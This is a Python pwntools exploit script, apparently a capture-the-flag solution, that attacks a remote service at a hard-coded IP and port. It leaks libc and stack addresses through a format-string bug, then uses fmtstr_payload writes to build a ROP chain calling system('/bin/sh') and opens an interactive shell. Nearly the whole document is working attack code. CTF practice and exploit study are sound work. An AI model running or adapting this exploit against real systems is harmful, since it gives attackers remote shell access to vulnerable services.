#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'  # Set log level to debug for detailed output


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("194.31.53.241",15128)

    return r


def main():
    r = conn()
    r.recvline()  # Skip the initial message
    r.recvline()  # Skip the next line
    # r.recvline()  # Skip the next line
    r.sendline("%1$pLOL%3$p")
    leak = r.recvline().strip().decode()
    # r.recvuntil(b'Enter the password : ')
    # print(r.recvline().strip().decode())
    # decoded = leak.decode()
    parts = leak.split("LOL")

    libc_leak = int(parts[0][-14:], 16)  # Grab ending of part[0] which ends in the libc address
    stack_leak = int(parts[1][:14], 16)  # Grab beginning of part[1] which starts with the stack address

    print(f"Libc leak:  {hex(libc_leak)}")
    print(f"Stack leak: {hex(stack_leak)}")
    # good luck pwning :)
    libc.address = libc_leak - 0x1e7963  # Adjust the offset based on the leaked addres
    stack_base = stack_leak - 0x1fc30  # Adjust the offset based on the stack leak
    target = stack_base + 0x1fd48  # Calculate the target address for the stack
    print(f"Libc base:  {hex(libc.address)}")
    print(f"Stack base: {hex(stack_base)}")
    print(f"Target address: {hex(target)}")
    one_gadget = libc.address + 0xfb062  # Adjust the offset for the one_gadget
    ret = libc.address + 0x000000000002846b
    bin_sh = next(libc.search(b"/bin/sh\x00"))  # Find the address of "/bin/sh" in libc
    pop_rdi = libc.address + 0x000000000002a145
    r.sendline(fmtstr_payload(6,{target: pop_rdi}))
    r.sendline(fmtstr_payload(6,{target + 8: bin_sh}))
    r.sendline(fmtstr_payload(6,{target + 16: ret}))
    r.sendline(fmtstr_payload(6,{target + 24: libc.sym['system']}))
    sleep(3)
    r.sendline(b"kata-kata-hari-ini-bang-mike\x00")
    r.interactive()


if __name__ == "__main__":
    main()
